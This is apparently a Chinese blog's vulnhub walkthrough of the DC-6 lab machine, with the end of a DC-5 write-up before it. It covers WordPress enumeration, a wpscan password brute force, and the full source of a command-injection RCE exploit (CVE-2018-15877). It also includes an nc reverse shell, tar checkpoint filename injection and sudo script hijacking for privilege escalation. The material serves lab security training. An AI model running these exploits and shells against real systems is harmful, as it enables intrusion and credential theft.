2&gt;/dev/null/bin/su/bin/mount/bin/umount/bin/screen-4.5.0/usr/bin/gpasswd/usr/bin/procmail/usr/bin/at/usr/bin/passwd/usr/bin/chfn/usr/bin/newgrp/usr/bin/chsh/usr/lib/openssh/ssh-keysign/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/eject/dmcrypt-get-device/usr/sbin/exim4/sbin/mount.nfs\n\n我们在gtfobins查了一下，发现screen-4.5.0可以利用用于写文件。\n然而尝试之后并没能成功利用，各种写入失败。那就找找其他的利用方式，在searchsploit搜了一下发现还真有exp。\n下载下来运行失败了。查了一下网上，说是拆成三个文件然后本地编译完再传到靶机。\n尝试一下发现内核版本差别太大导致靶机上运行会缺少库。然而在靶机上编译也会缺少库。搞了好久也没发现比较好的解决方案。\n总之提权的思路和路径都是没错的，最后一步就当提权成功了。和解了。\n","categories":["vulnhub"],"tags":["walkthrough","DC"]},{"title":"[vulnhub]  DC:6","url":"/2023/06/03/DC-6/","content":"\n\n\n简介DC系列第6台机子。主要内容是对wordpress里一些插件及工具的利用拿shell，提权部分就考信息收集能力吧。\n开始之前别忘了在/etc/hosts里加上wordy对应的IP，不然会出问题。\n信息搜集Port Scan:\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 21:57 CSTWarning: 192.168.56.115 giving up on port because retransmission cap hit (10).Nmap scan report for 192.168.56.115Host is up (0.00075s latency).Not shown: 37431 filtered tcp ports (no-response), 28102 closed tcp ports (reset)PORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpMAC Address: 08:00:27:E1:6F:2C (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 110.00 seconds\n\nTCP, Service, OS Scan:\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 21:59 CSTNmap scan report for 192.168.56.115Host is up (0.00072s latency).PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)80/tcp open  http    Apache httpd 2.4.25 ((Debian))MAC Address: 08:00:27:E1:6F:2C (Oracle VirtualBox virtual NIC)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 9.97 seconds\n\nUDP Scan:\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 21:59 CSTNmap scan report for 192.168.56.115Host is up (0.0010s latency).All 1000 scanned ports on 192.168.56.115 are in ignored states.Not shown: 958 closed udp ports (port-unreach), 42 open|filtered udp ports (no-response)MAC Address: 08:00:27:E1:6F:2C (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 1042.12 seconds\n\nSimple Vuln Scan:\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-06-03 14:12 CSTNmap scan report for 192.168.56.115Host is up (0.00023s latency).Not shown: 998 closed tcp ports (reset)PORT   STATE SERVICE22/tcp open  ssh80/tcp open  http|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.| http-wordpress-users: | Username found: admin| Username found: graham| Username found: mark| Username found: sarah| Username found: jens|_Search stopped at ID #25. Increase the upper limit if necessary with &#x27;http-wordpress-users.limit&#x27;| http-enum: |   /wp-login.php: Possible admin folder|   /readme.html: Wordpress version: 2 |   /wp-includes/images/rss.png: Wordpress version 2.2 found.|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.|   /wp-login.php: Wordpress login page.|   /wp-admin/upgrade.php: Wordpress login page.|_  /readme.html: Interesting, a readme.|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.MAC Address: 08:00:27:E1:6F:2C (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 32.25 seconds\n\nnikto Vuln Scan:\n- Nikto v2.5.0---------------------------------------------------------------------------+ Target IP:          192.168.56.115+ Target Hostname:    192.168.56.115+ Target Port:        80+ Start Time:         2023-06-03 14:13:20 (GMT8)---------------------------------------------------------------------------+ Server: Apache/2.4.25 (Debian)+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options+ /: Uncommon header &#x27;x-redirect-by&#x27; found, with contents: WordPress.+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/+ Root page / redirects to: http://wordy/+ /index.php?: Drupal Link header found with value: ARRAY(0x5574d9921688). See: https://www.drupal.org/+ No CGI Directories found (use &#x27;-C all&#x27; to force check all possible dirs)+ Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/+ /wp-links-opml.php: This WordPress script reveals the installed version.+ /license.txt: License file found may identify site software.+ /wp-login.php?action=register: Cookie wordpress_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies+ /wp-login.php: Wordpress login found.+ 8102 requests: 0 error(s) and 11 item(s) reported on remote host+ End Time:           2023-06-03 14:13:50 (GMT8) (30 seconds)---------------------------------------------------------------------------+ 1 host(s) tested\n\nweb fingerprint Scan:\nhttp://wordy [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[192.168.56.115], JQuery[1.12.4], MetaGenerator[WordPress 5.1.1], PoweredBy[WordPress], Script[text/javascript], Title[Wordy &amp;#8211; Just another WordPress site], UncommonHeaders[link], WordPress[5.1.1]\n\n看下来还是有挺多信息的。首先端口开了22和80，漏扫和网页指纹识别也识别出来了网站是用wordpress 5.1.1版本搭建的，并且还把用户名都给爆出来了。\n既然用的是wordpress，当然wpscan会出手。\n┌──(kali㉿kali)-[~/vulnhub/DC/6/workSpace]└─$ sudo wpscan --url http://wordy -e                                                              _______________________________________________________________         __          _______   _____         \\ \\        / /  __ \\ / ____|          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ ®           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | &#x27;_ \\            \\  /\\  /  | |     ____) | (__| (_| | | | |             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|         WordPress Security Scanner by the WPScan Team                         Version 3.8.22       Sponsored by Automattic - https://automattic.com/       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart_______________________________________________________________[i] It seems like you have not updated the database for some time.[?] Do you want to update now? [Y]es [N]o, default: [N]Y[i] Updating the Database ...[i] Update completed.[+] URL: http://wordy/ [192.168.56.115][+] Started: Sat Jun  3 14:28:44 2023Interesting Finding(s):[+] Headers | Interesting Entry: Server: Apache/2.4.25 (Debian) | Found By: Headers (Passive Detection) | Confidence: 100%[+] XML-RPC seems to be enabled: http://wordy/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: |  - http://codex.wordpress.org/XML-RPC_Pingback_API |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/[+] WordPress readme found: http://wordy/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100%[+] The external WP-Cron seems to be enabled: http://wordy/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: |  - https://www.iplocation.net/defend-wordpress-from-ddos |  - https://github.com/wpscanteam/wpscan/issues/1299[+] WordPress version 5.1.1 identified (Insecure, released on 2019-03-13). | Found By: Rss Generator (Passive Detection) |  - http://wordy/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.1.1&lt;/generator&gt; |  - http://wordy/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.1.1&lt;/generator&gt;[+] WordPress theme in use: twentyseventeen | Location: http://wordy/wp-content/themes/twentyseventeen/ | Last Updated: 2023-03-29T00:00:00.000Z | Readme: http://wordy/wp-content/themes/twentyseventeen/README.txt | [!] The version is out of date, the latest version is 3.2 | Style URL: http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1 | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 2.1 (80% confidence) | Found By: Style (Passive Detection) |  - http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1, Match: &#x27;Version: 2.1&#x27;[+] Enumerating Vulnerable Plugins (via Passive Methods)[i] No plugins Found.[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:00:00 &lt;=============================================&gt; (500 / 500) 100.00% Time: 00:00:00[+] Checking Theme Versions (via Passive and Aggressive Methods)[i] No themes Found.[+] Enumerating Timthumbs (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:00:04 &lt;===========================================&gt; (2575 / 2575) 100.00% Time: 00:00:04[i] No Timthumbs Found.[+] Enumerating Config Backups (via Passive and Aggressive Methods) Checking Config Backups - Time: 00:00:00 &lt;==============================================&gt; (137 / 137) 100.00% Time: 00:00:00[i] No Config Backups Found.[+] Enumerating DB Exports (via Passive and Aggressive Methods) Checking DB Exports - Time: 00:00:00 &lt;====================================================&gt; (71 / 71) 100.00% Time: 00:00:00[i] No DB Exports Found.[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to &quot;Plain&quot; for those to be detected) Brute Forcing Attachment IDs - Time: 00:00:01 &lt;=========================================&gt; (100 / 100) 100.00% Time: 00:00:01[i] No Medias Found.[+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:00 &lt;===============================================&gt; (10 / 10) 100.00% Time: 00:00:00[i] User(s) Identified:[+] admin | Found By: Rss Generator (Passive Detection) | Confirmed By: |  Wp Json Api (Aggressive Detection) |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection) |  Login Error Messages (Aggressive Detection)[+] sarah | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[+] graham | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[+] mark | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[+] jens | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[!] No WPScan API Token given, as a result vulnerability data has not been output.[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register[+] Finished: Sat Jun  3 14:28:56 2023[+] Requests Done: 3455[+] Cached Requests: 8[+] Data Sent: 892.988 KB[+] Data Received: 13.49 MB[+] Memory used: 299.664 MB[+] Elapsed time: 00:00:12\n\n用户名和之前扫描结果对上了，其他有漏洞的插件以及备份啥的没有发现。既然拿到用户名了，当然得试试能不能爆破一下登录了。\nweb渗透字典登录爆破要爆破首先要有字典，根据之前打DC系列机子的经验，我们可以先根据网站信息使用cewl生成一个字典。先试试这个字典能不能成，不行再直接用rockyou慢慢跑吧。\n┌──(kali㉿kali)-[~/vulnhub/DC/6/workSpace]└─$ cewl http://wordy &gt; cewlpass\n\n然后把之前的用户名存到一个username文件里。爆破一下试试。\n┌──(kali㉿kali)-[~/vulnhub/DC/6/workSpace]└─$ sudo wpscan --url http://wordy -U username -P cewlpass                                   _______________________________________________________________         __          _______   _____         \\ \\        / /  __ \\ / ____|          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ ®           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | &#x27;_ \\            \\  /\\  /  | |     ____) | (__| (_| | | | |             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|         WordPress Security Scanner by the WPScan Team                         Version 3.8.22       Sponsored by Automattic - https://automattic.com/       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart_______________________________________________________________[+] URL: http://wordy/ [192.168.56.115][+] Started: Sat Jun  3 14:55:39 2023......[+] Performing password attack on Xmlrpc against 5 user/sTrying mark / here Time: 00:00:09 &lt;======================================================&gt; (445 / 445) 100.00% Time: 00:00:09[i] No Valid Passwords Found.[!] No WPScan API Token given, as a result vulnerability data has not been output.[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register[+] Finished: Sat Jun  3 14:55:53 2023[+] Requests Done: 618[+] Cached Requests: 5[+] Data Sent: 264.483 KB[+] Data Received: 632.724 KB[+] Memory used: 252.391 MB[+] Elapsed time: 00:00:14\n\n可惜没有成功，那我们就拿rockyou跑吧。\n但是rockyou太大了，跑完到猴年马月。但是幸好作者给我们了一个小提示：\n\nCLUEOK, this isn’t really a clue as such, but more of some “we don’t want to spend five years waiting for a certain process to finish” kind of advice for those who just want to get on with the job.\ncat &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt | grep k01 &gt; passwords.txt That should save you a few years. ;-)\n\n说明我们要的密码部分在有‘k01’的部分。我们用这个rockyou的部分字典试着跑一下。\n┌──(kali㉿kali)-[~/vulnhub/DC/6/workSpace]└─$ sudo wpscan --url http://wordy -U username -P passwords.txt _______________________________________________________________         __          _______   _____         \\ \\        / /  __ \\ / ____|          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ ®           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | &#x27;_ \\            \\  /\\  /  | |     ____) | (__| (_| | | | |             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|         WordPress Security Scanner by the WPScan Team                         Version 3.8.22       Sponsored by Automattic - https://automattic.com/       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart_______________________________________________________________[+] URL: http://wordy/ [192.168.56.115][+] Started: Sat Jun  3 14:56:04 2023......[+] Performing password attack on Xmlrpc against 5 user/s[SUCCESS] - mark / helpdesk01                                                                                                Trying jens / !lak019b Time: 00:04:24 &lt;======================================         &gt; (12547 / 15215) 82.46%  ETA: ??:??:??[!] Valid Combinations Found: | Username: mark, Password: helpdesk01[!] No WPScan API Token given, as a result vulnerability data has not been output.[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register[+] Finished: Sat Jun  3 15:00:32 2023[+] Requests Done: 12687[+] Cached Requests: 38[+] Data Sent: 6.214 MB[+] Data Received: 7.403 MB[+] Memory used: 289.926 MB[+] Elapsed time: 00:04:28\n\n发现了mark的密码helpdesk01。\n后台拿shell登进来后台看了看，因为mark这个用户不是admin，所以我们不能操作我们最喜欢的plugin以及theme模块。那到底哪里有上传点呢？\n我们四处观察了一下，tools里面啥也没有，侧边栏里面就剩下一个Activity monitor比较可疑了。\n\n我们都知道wordpress里的好多插件或工具有可能存在漏洞，那我们就去搜一下吧。\n┌──(kali㉿kali)-[~/vulnhub/DC/6/workSpace]└─$ searchsploit wordpress activity monitor------------------------------------------------------------------------------------------- --------------------------------- Exploit Title                                                                             |  Path------------------------------------------------------------------------------------------- ---------------------------------WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Injection   | php/webapps/45274.htmlWordPress Plugin Plainview Activity Monitor 20161228 - Remote Code Execution (RCE) (Authen | php/webapps/50110.py------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No Results\n\n我们惊喜的发现真的有。那我们直接下载下来。下面附上50110.py的源码：\n┌──(kali㉿kali)-[~/vulnhub/DC/6/workSpace]└─$ cat 50110.py  # Exploit Title: WordPress Plugin Plainview Activity Monitor 20161228 - Remote Code Execution (RCE) (Authenticated) (2)# Date: 07.07.2021# Exploit Author: Beren Kuday GORUN# Vendor Homepage: https://wordpress.org/plugins/plainview-activity-monitor/# Software Link: https://www.exploit-db.com/apps/2e1f384e5e49ab1d5fbf9eedf64c9a15-plainview-activity-monitor.20161228.zip# Version: 20161228 and possibly prior# Fixed version: 20180826# CVE : CVE-2018-15877&quot;&quot;&quot;-------------------------Usage:┌──(root@kali)-[~/tools]└─# python3 WordPress-Activity-Monitor-RCE.pyWhat&#x27;s your target IP?192.168.101.28What&#x27;s your username?markWhat&#x27;s your password?password123[*] Please wait...[*] Perfect!www-data@192.168.101.28  whoamiwww-datawww-data@192.168.101.28  pwd/var/www/html/wp-adminwww-data@192.168.101.28  iduid=33(www-data) gid=33(www-data) groups=33(www-data)&quot;&quot;&quot;import requestsfrom bs4 import BeautifulSoupdef exploit(whoami, ip):        while 1:                cmd = input(whoami+&quot;@&quot;+ip+&quot;  &quot;)                url = &#x27;http://&#x27; + ip + &#x27;/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools&#x27;                payload = &quot;google.com.tr | &quot; + cmd                data = &#123;&#x27;ip&#x27;: payload , &#x27;lookup&#x27; : &#x27;lookup&#x27; &#125;                x = requests.post(url, data = data, cookies=getCookie(ip))                html_doc = x.text.split(&quot;&lt;p&gt;Output from dig: &lt;/p&gt;&quot;)[1]                soup = BeautifulSoup(html_doc, &#x27;html.parser&#x27;)                print(soup.p.text)def poc(ip):        url = &#x27;http://&#x27; + ip + &#x27;/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools&#x27;        myobj = &#123;&#x27;ip&#x27;: &#x27;google.fr | whoami&#x27;, &#x27;lookup&#x27; : &#x27;lookup&#x27; &#125;        x = requests.post(url, data = myobj, cookies=getCookie(ip))        html_doc = x.text.split(&quot;&lt;p&gt;Output from dig: &lt;/p&gt;&quot;)[1]        soup = BeautifulSoup(html_doc, &#x27;html.parser&#x27;)        print(&quot;[*] Perfect! &quot;)        exploit(soup.p.text, ip)def getCookie(ip):        url = &#x27;http://&#x27; + ip + &#x27;/wp-login.php&#x27;        #log=admin&amp;pwd=admin&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Fwordy%2Fwp-admin%2F&amp;testcookie=1        data = &#123;&#x27;log&#x27;:username, &#x27;pwd&#x27;:password, &#x27;wp-submit&#x27;:&#x27;Log In&#x27;, &#x27;testcookie&#x27;:&#x27;1&#x27;&#125;        x = requests.post(url, data = data)        cookies = &#123;&#125;        cookie = str(x.headers[&quot;Set-Cookie&quot;])        for i in cookie.split():                if(i.find(&quot;wordpress&quot;) != -1 and i.find(&quot;=&quot;) != -1):                        cookies[i.split(&quot;=&quot;)[0]] = i.split(&quot;=&quot;)[1][:len(i.split(&quot;=&quot;)[1])-1]        return cookiesip = input(&quot;What&#x27;s your target IP?\\n&quot;)username = input(&quot;What&#x27;s your username?\\n&quot;)password = input(&quot;What&#x27;s your password?\\n&quot;)print(&quot;[*] Please wait...&quot;)poc(ip)\n\n根据usage，我们尝试利用get shell。\n┌──(kali㉿kali)-[~/vulnhub/DC/6/workSpace]└─$ python3 50110.py               What&#x27;s your target IP?192.168.56.115What&#x27;s your username?markWhat&#x27;s your password?helpdesk01[*] Please wait...[*] Perfect! www-data@192.168.56.115 \n\n成功拿shell。\n当然这个shell不是很稳定，所以我们在用nc创建一个反弹shell:nc 192.168.56.144 443 -e /bin/bash\n┌──(kali㉿kali)-[~/vulnhub/DC/6/workSpace]└─$ sudo nc -lvp 443                                           [sudo] password for kali: listening on [any] 443 ...connect to [192.168.56.144] from wordy [192.168.56.115] 54500whoamiwww-datawhich python/usr/bin/pythonpython -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;);&quot;www-data@dc-6:/var/www/html/wp-admin$\n\n成功！\n提权手动枚举接下来就是提权。\n喜闻乐见的就是没有www-data用户的密码无法列出可以sudo的范围。\n令人遗憾的是也没有可用于提权的set suid位二进制文件。定时任务也是啥也没有。\nconfig文件我们查看一下config文件，里面倒是有数据库链接密码\nwww-data@dc-6:/var/www/html$ cat wp-config.phpcat wp-config.php&lt;?php/** * The base configuration for WordPress * * The wp-config.php creation script uses this file during the * installation. You don&#x27;t have to use the web site, you can * copy this file to &quot;wp-config.php&quot; and fill in the values. * * This file contains the following configurations: * * * MySQL settings * * Secret keys * * Database table prefix * * ABSPATH * * @link https://codex.wordpress.org/Editing_wp-config.php * * @package WordPress */// ** MySQL settings - You can get this info from your web host ** ///** The name of the database for WordPress */define(&#x27;WP_HOME&#x27;,&#x27;http://wordy&#x27;);define(&#x27;WP_SITEURL&#x27;,&#x27;http://wordy&#x27;);define( &#x27;DB_NAME&#x27;, &#x27;wordpressdb&#x27; );/** MySQL database username */define( &#x27;DB_USER&#x27;, &#x27;wpdbuser&#x27; );/** MySQL database password */define( &#x27;DB_PASSWORD&#x27;, &#x27;meErKatZ&#x27; );/** MySQL hostname */define( &#x27;DB_HOST&#x27;, &#x27;localhost&#x27; );/** Database Charset to use in creating database tables. */define( &#x27;DB_CHARSET&#x27;, &#x27;utf8&#x27; );/** The Database Collate type. Don&#x27;t change this if in doubt. */define( &#x27;DB_COLLATE&#x27;, &#x27;&#x27; );\n\n登进去在wordpressdb数据库下的wp_users表中可以查到对应账户的密码。\nMariaDB [wordpressdb]&gt; select * from wp_users;\\gselect * from wp_users;\\g+----+------------+------------------------------------+---------------+-----------------------------+----------+---------------------+-----------------------------------------------+-------------+-----------------+| ID | user_login | user_pass                          | user_nicename | user_email                  | user_url | user_registered     | user_activation_key                           | user_status | display_name    |+----+------------+------------------------------------+---------------+-----------------------------+----------+---------------------+-----------------------------------------------+-------------+-----------------+|  1 | admin      | $P$BDhiv9Y.kOYzAN8XmDbzG00hpbb2LA1 | admin         | blah@blahblahblah1.net.au   |          | 2019-04-24 12:52:10 |                                               |           0 | admin           ||  2 | graham     | $P$B/mSJ8xC4iPJAbCzbRXKilHMbSoFE41 | graham        | graham@blahblahblah1.net.au |          | 2019-04-24 12:54:57 |                                               |           0 | Graham Bond     ||  3 | mark       | $P$BdDI8ehZKO5B/cJS8H0j1hU1J9t810/ | mark          | mark@blahblahblah1.net.au   |          | 2019-04-24 12:55:39 |                                               |           0 | Mark Jones      ||  4 | sarah      | $P$BEDLXtO6PUnSiB6lVaYkqUIMO/qx.3/ | sarah         | sarah@blahblahblah1.net.au  |          | 2019-04-24 12:56:10 |                                               |           0 | Sarah Balin     ||  5 | jens       | $P$B//75HFVPBwqsUTvkBcHA8i4DUJ7Ru0 | jens          | jens@blahblahblah1.net.au   |          | 2019-04-24 13:04:40 | 1556111080:$P$B5/.DwEMzMFh3bvoGjPgnFO0Qtd3p./ |           0 | Jens Dagmeister |+----+------------+------------------------------------+---------------+-----------------------------+----------+---------------------+-----------------------------------------------+-------------+-----------------+5 rows in set (0.00 sec)ERROR: No query specified\n\n可惜存的都是wordpress hash后的md5值（phppass格式），破解不出来（john挂在旁边尝试到25%左右）。\n密码复用的路就先搁置吧。\nhome目录这台机子是多用户环境，看看各个用户home目录里面都有啥。\ngraham和sarah目录下啥也没有。\njens目录下有个backup.sh\nwww-data@dc-6:/home/jens$ ls -lals -latotal 28drwxr-xr-x 2 jens jens 4096 Apr 26  2019 .drwxr-xr-x 6 root root 4096 Apr 26  2019 ..-rw------- 1 jens jens    5 Apr 26  2019 .bash_history-rw-r--r-- 1 jens jens  220 Apr 24  2019 .bash_logout-rw-r--r-- 1 jens jens 3526 Apr 24  2019 .bashrc-rw-r--r-- 1 jens jens  675 Apr 24  2019 .profile-rwxrwxr-x 1 jens devs   50 Apr 26  2019 backups.shwww-data@dc-6:/home/jens$ cat baccat backups.sh #!/bin/bashtar -czf backups.tar.gz /var/www/html\n\n其操作不难理解，就是备份网页目录，可惜所有者是jens且不是定时任务。\n那我们再看看mark\nwww-data@dc-6:/home$ cd mark cd markwww-data@dc-6:/home/mark$ ls -lals -latotal 28drwxr-xr-x 3 mark mark 4096 Apr 26  2019 .drwxr-xr-x 6 root root 4096 Apr 26  2019 ..-rw------- 1 mark mark    5 Apr 26  2019 .bash_history-rw-r--r-- 1 mark mark  220 Apr 24  2019 .bash_logout-rw-r--r-- 1 mark mark 3526 Apr 24  2019 .bashrc-rw-r--r-- 1 mark mark  675 Apr 24  2019 .profiledrwxr-xr-x 2 mark mark 4096 Apr 26  2019 stuffwww-data@dc-6:/home/mark$ cd stuffcd stuffwww-data@dc-6:/home/mark/stuff$ ls -lals -latotal 12drwxr-xr-x 2 mark mark 4096 Apr 26  2019 .drwxr-xr-x 3 mark mark 4096 Apr 26  2019 ..-rw-r--r-- 1 mark mark  241 Apr 26  2019 things-to-do.txtwww-data@dc-6:/home/mark/stuff$ cat thincat things-to-do.txt Things to do:- Restore full functionality for the hyperdrive (need to speak to Jens)- Buy present for Sarah&#x27;s farewell party- Add new user: graham - GSo7isUM1D4 - done- Apply for the OSCP course- Buy new laptop for Sarah&#x27;s replacement\n\n发现还是mark老哥能处，不仅网站登录密码简单，还给我们带来了新的登陆凭证 graham - GSo7isUM1D4。 ssh登陆一下\n┌──(kali㉿kali)-[~/vulnhub/DC/6/workSpace]└─$ ssh graham@192.168.56.115graham@192.168.56.115&#x27;s password: Linux dc-6 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.graham@dc-6:~$\n\n非常的对。\ngraham@dc-6:~$ sudo -lMatching Defaults entries for graham on dc-6:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser graham may run the following commands on dc-6:    (jens) NOPASSWD: /home/jens/backups.sh\n\ngraham竟然可以以jens身份执行backups.sh。因为用的tar，我们知道有个利用tar --checkpoint提权的方法，我们试着弹个jens的反弹shell回来。\nwww-data@dc-6:/var/www/html$ ls -lals -latotal 228-rw-r--r--  1 www-data www-data     1 Jun  3 18:04 --checkpoint-action=exec=sh sujens.sh-rw-r--r--  1 www-data www-data     1 Jun  3 17:55 --checkpoint=1drwxr-xr-x  5 www-data devs      4096 Jun  3 18:04 .drwxr-xr-x  3 root     root      4096 Apr 26  2019 ..-rw-r--r--  1 www-data devs       420 Dec  1  2017 index.php-rw-r--r--  1 www-data devs     19935 Jan  2  2019 license.txt-rw-r--r--  1 www-data devs      7425 Jan  9  2019 readme.html-rwxr-xr-x  1 www-data www-data    35 Jun  3 17:58 sujens.sh-rw-r--r--  1 www-data devs      6919 Jan 12  2019 wp-activate.phpdrwxr-xr-x  9 www-data devs      4096 Mar 13  2019 wp-admin-rw-r--r--  1 www-data devs       369 Dec  1  2017 wp-blog-header.php-rw-r--r--  1 www-data devs      2283 Jan 21  2019 wp-comments-post.php-rw-r--r--  1 www-data devs      2898 Jan  8  2019 wp-config-sample.php-rw-r--r--  1 www-data devs      3268 Apr 26  2019 wp-config.phpdrwxr-xr-x  4 www-data devs      4096 Apr 26  2019 wp-content-rw-r--r--  1 www-data devs      3847 Jan  9  2019 wp-cron.phpdrwxr-xr-x 19 www-data devs     12288 Mar 13  2019 wp-includes-rw-r--r--  1 www-data devs      2502 Jan 16  2019 wp-links-opml.php-rw-r--r--  1 www-data devs      3306 Dec  1  2017 wp-load.php-rw-r--r--  1 www-data devs     38883 Jan 12  2019 wp-login.php-rw-r--r--  1 www-data devs      8403 Dec  1  2017 wp-mail.php-rw-r--r--  1 www-data devs     17947 Jan 30  2019 wp-settings.php-rw-r--r--  1 www-data devs     31085 Jan 17  2019 wp-signup.php-rw-r--r--  1 www-data devs      4764 Dec  1  2017 wp-trackback.php-rw-r--r--  1 www-data devs      3068 Aug 17  2018 xmlrpc.phpwww-data@dc-6:/var/www/html$ cat sujens.shcat sujens.shnc 192.168.56.144 443 -e /bin/bash\n\n然而并没有得逞，执行backups.sh没能给我弹回反弹shell。原因可能是需要以通配符形式备份才行，这种直接备份一整个文件夹的可能不行。\n那咋整呢。我们仔细观察了一下文件权限-rwxrwxr-x 1 jens devs   50 Apr 26  2019 backups.sh，发现其权限是775，其他用户不能写，但他的组devs可以读写。我们看一下graham的id。\ngraham@dc-6:/home/jens$ iduid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs)\n\n惊喜发现其就是属于devs组的。那接下来就简单了，可以直接写入就方便了。直接vim向其中加入/bin/bash,然后sudo以jens身份执行。\ngraham@dc-6:/home/jens$ vim backups.sh graham@dc-6:/home/jens$ cat backups.sh #!/bin/bashtar -czf backups.tar.gz /var/www/html/bin/bashgraham@dc-6:/home/jens$ sudo -u jens ./backups.shtar: Removing leading `/&#x27; from member namesjens@dc-6:~$ whoamijens\n\n我们看看jens的sudo权限，发现可以使用nmap，那我们直接利用nmap的自定义脚本提权。\njens@dc-6:~$ sudo -lMatching Defaults entries for jens on dc-6:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser jens may run the following commands on dc-6:    (root) NOPASSWD: /usr/bin/nmapjens@dc-6:~$ sudo nmap --interactivenmap: unrecognized option &#x27;--interactive&#x27;See the output of nmap -h for a summary of options.jens@dc-6:~$ 